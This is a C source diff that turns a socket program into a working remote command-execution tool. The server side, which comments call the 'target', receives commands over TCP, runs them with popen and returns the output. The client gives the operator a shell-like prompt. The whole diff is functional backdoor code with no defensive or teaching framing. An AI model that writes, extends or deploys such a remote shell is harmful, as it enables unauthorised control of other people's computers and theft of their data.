@@ -11,6 +11,9 @@
 
 #define MSG_CHUNK 0x200       // Buffer size.
 
+// flags for get stream data function.
+#define READ_LINE 0x1
+#define READ_ALL  0x2
 
 static int sendall(int sock_fd, const char *msg)
 {
@@ -63,6 +66,60 @@ static int recvall(char **dst, int sock_fd)
     return 0;
 }
 
+static char *get_stream_data(FILE *stream, 
+                             size_t init_size, int flag)
+{
+    char *input = NULL;
+    int curr_ch;
+    size_t curr_len = 0;
+
+    // Allocate space for init_size characters.
+    input = (char *) malloc(sizeof(char) * init_size);
+    if (input == NULL) return NULL;
+
+    // TODO - optimize this thing.
+    if (flag == READ_ALL) {
+        while ((curr_ch = fgetc(stream)) != EOF) {
+           input[curr_len++] = curr_ch;
+           if (curr_len == init_size) {
+               input = (char *) realloc(input, sizeof(char) * 
+                                       (init_size += 10));
+               if (input == NULL) return NULL;
+           }
+        }
+    } else {
+        while ((curr_ch = fgetc(stream)) != EOF 
+			   && curr_ch != '\n') {
+            input[curr_len++] = curr_ch;
+            if (curr_len == init_size) {
+                input = (char *) realloc(input, sizeof(char) * 
+                                        (init_size += 10));
+                if (input == NULL) return NULL;
+            }
+        }
+    }
+    
+    input[curr_len++] = '\0';
+
+    // Decreace the memory to the exac size of string.
+    return (char *) realloc(input, sizeof(char) * curr_len);
+}
+
+// executes a command in taget's computer.
+static char *execute_command(const char *cmd)
+{
+    FILE *cmd_stream = NULL;
+    // execute the command.
+    cmd_stream = popen(cmd, "r");
+    if (cmd_stream == NULL) return NULL;
+    // read the data of the cmd_out stream.
+    char *cmd_out = get_stream_data(cmd_stream, 10, READ_ALL);
+    if (cmd_out == NULL) return NULL;
+
+    pclose(cmd_stream); // close stream.
+    return cmd_out;
+}
+
 static int run_server(const u_short port)
 {
     struct sockaddr_in se_addr;
@@ -85,8 +142,9 @@ static int run_server(const u_short port)
              sizeof(se_addr)) == -1) return -1;
 
     // listen for connection.
-    char *command = NULL;
-    int is_conn_alive = EPIPE;
+    char *cmd = NULL;
+    char *cmd_out = NULL;
+    int is_conn_alive = 0;
     while (1) {
         if (listen(se_fd, 3) == -1) continue;
 
@@ -97,50 +155,24 @@ static int run_server(const u_short port)
         // check if the client is dead.
         while (is_conn_alive != -1) {
             // if for some reason we can't recieve packets, close connection.
-            if (recvall(&command, cl_fd) == -1) break; // TODO - instead of break close connection.
+            if (recvall(&cmd, cl_fd) == -1) break; // TODO - instead of break close connection.
+            cmd_out = execute_command(cmd);            
+            if (cmd_out == NULL) break; // TODO - send that the command failed to execute.
+            // send the output.
+            if (sendall(cl_fd, cmd_out) == -1) break; // TODO - break?
 
-            is_conn_alive = send(cl_fd, &is_conn_alive,
-                                 sizeof(is_conn_alive), 0);
+            free(cmd);
+            free(cmd_out);
+            // TODO - do not check if the connection if alive only by checking if send is returned -1.
+            //is_conn_alive = send(cl_fd, &is_conn_alive,
+            //                     sizeof(is_conn_alive), 0);
         }
 
-        if (recvall(&command, cl_fd) == -1) 
-        {
-            printf("Error\n");
-            return -1;
-        }
-        // TODO - recieve the requested command.
-        // TODO - send the results.
+        close(cl_fd);
     }
 
-    close(cl_fd);
     shutdown(se_fd, SHUT_RDWR);
     return 0;
-}
-
-char *get_user_input(FILE *stream, 
-                     size_t init_size)
-{
-    char *input = NULL;
-    int curr_ch;
-    size_t curr_len = 0;
-
-    // Allocate space for init_size characters.
-    input = (char *) malloc(sizeof(char) * init_size);
-    if (input == NULL) return NULL;
-
-    while ((curr_ch = fgetc(stream)) != EOF 
-			&& curr_ch != '\n') {
-        input[curr_len++] = curr_ch;
-        if (curr_len == init_size) {
-            input = (char *) realloc(input, sizeof(char) * 
-                                    (init_size += 10));
-            if (input == NULL) return NULL;
-        }
-    }
-    input[curr_len++] = '\0';
-
-    // Decreace the memory to the exac size of string.
-    return (char *) realloc(input, sizeof(char) * curr_len);
 }
 
 static int run_client(const u_short port, 
@@ -163,29 +195,38 @@ static int run_client(const u_short port,
 
     // connect to the server.
     if (connect(cl_fd, (struct sockaddr *)& se_sock_addr,
-                        sizeof(se_sock_addr)) == -1) return -1;
+                        sizeof(se_sock_addr)) == -1) {
+        printf("Connection failed.");
+        return -1;
+    }
 
     char *input = NULL;
+    char *cmd_out = NULL;
 
     // simulate a shell like prompt.
     while (1) {
         printf("-> ");
-        input = get_user_input(stdin, 10);
+        input = get_stream_data(stdin, 10, READ_LINE); // get the user input.
         if (input == NULL) return -1;
         printf("\n");
 
-        if (sendall(cl_fd, input) == 0)
-        {
-            printf("Command sended\n");
+        // Send the requested command to server ( target ).
+        if (sendall(cl_fd, input) == -1) {
+            printf("Failed to send the requested command,"
+                   "check your connection or restart client and try again\n");
         }
-        // Send a request to the server to execute the command.
-        // TODO - send the data.
         // recieve the output.
+        if (recvall(&cmd_out, cl_fd) == -1) {
+             printf("Failed to recieve the output of the requested command,"
+                    "check your connection or restart client and try again\n");
+        }
 
-        // TODO - recieve from the server the results of the command.
+        printf("%s\n", cmd_out);
         free(input);
+        free(cmd_out);
     }
 
+    printf("Connection closed.");
     close(cl_fd);
     return 0;
 }
